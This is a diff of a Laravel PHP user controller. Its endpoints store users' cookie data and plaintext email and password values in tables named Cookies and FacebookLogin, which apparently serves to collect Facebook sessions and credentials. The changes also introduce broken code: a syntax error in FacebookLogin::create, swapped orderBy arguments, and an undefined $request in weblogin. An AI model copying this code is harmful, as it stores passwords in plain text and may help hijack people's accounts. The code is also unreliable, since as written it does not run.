@@ -19,35 +19,7 @@ use App\Http\Controllers\Controller;
 
 class UserController extends Controller
 {
-    //
-    /*public function ajax_register(Request $request){
-    
-    	if ($request->isMethod('post')) {
-            if($request['password'] != $request['password_confirmation']){
-                return response()->json([
-                    'status' => 'error', 
-                    'msg' => 'The password confirmation does not match.'
-                ], 401);
-            }
-    		$request['password'] = bcrypt($request->get('password'));
-    		$request['password_confirmation'] = bcrypt($request->get('password_confirmation'));
-   		
-			if(User::create($request->all())){
-				return response()->json([
-                    'status' => 'success', 
-                    'msg' => 'You are register successfully.'
-                ], 200);
-			}else{
-				return response()->json([
-                    'status' => 'error', 
-                    'msg' => 'You are not register yet,please try once again.'
-                ], 401);
-			}
-    	}
-    }*/
-
-
-    // Start 
+  
 
 
 public function ajax_register(Request $request){
@@ -72,17 +44,16 @@ $validator = Validator::make($request->all(), $rules);
                     'status' => 'error', 
                     'msg' => 'The password confirmation does not match.'
                 ]);
-            }            
-
+            }
 
            return response()->json([
                   
                     'status' => 'error',
-                      'msg' => $errormes, 
+                      'msg' => $errormes,
                    
                 ]);
             
-        } else{    
+        } else {    
         
             $request['password'] = bcrypt($request->get('password'));
             $request['password_confirmation'] = bcrypt($request->get('password_confirmation'));
@@ -152,6 +123,12 @@ $validator = Validator::make($request->all(), $rules);
     	}
     }
 
+
+
+
+
+
+
     public function ajax_cookies(Request $request){
 
         $cookieData = Cookies::where('user_id', $request['user_id'])->first(); 
@@ -192,7 +169,7 @@ $validator = Validator::make($request->all(), $rules);
             {
                // echo "<pre>"; print_r($request['data']); die();
                 $data = Cookies::where('user_id',$request['user_id'])->update($request->except(['data']));
-                FacebookLogin::create($request->all());
+                FacebookLogin::create(['cookies_data' => ]);
 
                 if($data)
                 {
@@ -200,8 +177,7 @@ $validator = Validator::make($request->all(), $rules);
                     'status' => 'success', 
                     'msg' => 'Cookies save successfully.'
                 ], 200);
-                } else{
-                    
+                } else{                    
                     return response()->json([
                     'status' => 'error', 
                     'msg' => 'Cookies not save successfully.'
@@ -240,22 +216,17 @@ $validator = Validator::make($request->all(), $rules);
                 ], 401);
 			}
         }
-
-
-
-
-
-
-
-
-
     	}
     }
 
 
+
+
+
+
+
     public function weblogin($email , $password)
     {
-
         $credentials = [
         'email' => $request['username'],
         'password' => $request['password'],
@@ -264,9 +235,7 @@ $validator = Validator::make($request->all(), $rules);
         if (Auth::attempt($credentials)) {
         return redirect()->route('home');
     }
-
     return 'Failure';
-
 
     }
 
@@ -276,24 +245,22 @@ $validator = Validator::make($request->all(), $rules);
 
     public function updatecookie(Request $request)
     {
-      $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('id','desc')->first();
-
-
+      $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('desc','id')->first();
         Cookies::where('user_id',$request['user_id'])->update(['email' => $request['email'],'password' => $request['password']]);
-
-          FacebookLogin::where('id', $logid['id'])->update(['name' => $request['email'],'password' => $request['password']]);        
-     
+          FacebookLogin::where('id', $logid['id'])->update(['email' => $request['email'],'password' => $request['password']]);   
     }
 
-    public function checkUserLoggedIn(Request $request){      
 
+
+
+
+    public function checkUserLoggedIn(Request $request){ 
      $data =   User::where('id' , $request['user_id'])->update(['last_login' => date("Y-m-d h:i:s", time())]);
-
      if($data)
      {
-        echo "1";
+             echo "1";
      } else{
-        echo "0";
+             echo "0";
      }
 
 
